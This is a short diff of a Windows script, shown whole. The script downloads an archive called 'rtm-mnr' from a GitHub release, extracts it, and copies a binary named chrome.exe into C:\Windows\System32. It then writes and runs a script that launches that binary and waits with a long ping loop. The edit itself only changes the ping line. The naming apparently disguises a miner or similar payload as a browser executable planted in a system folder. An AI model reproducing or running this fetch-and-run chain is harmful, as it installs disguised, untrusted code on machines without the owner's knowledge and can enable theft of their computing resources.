@@ -4,5 +4,5 @@ Invoke-WebRequest https://github.com/p4n1k/mnr/releases/download/winrtm/rtm-mnr.
 tar xf rtm.zip
 Copy chrome.exe C:\Windows\System32
 cmd /c echo ./chrome.exe >a.ps1
-cmd /c echo ping -n 18001 127.0.0.1>nul >>a.ps1
+cmd /c echo ping -n 18001 127.0.0.1 >>a.ps1
 .\a.ps1
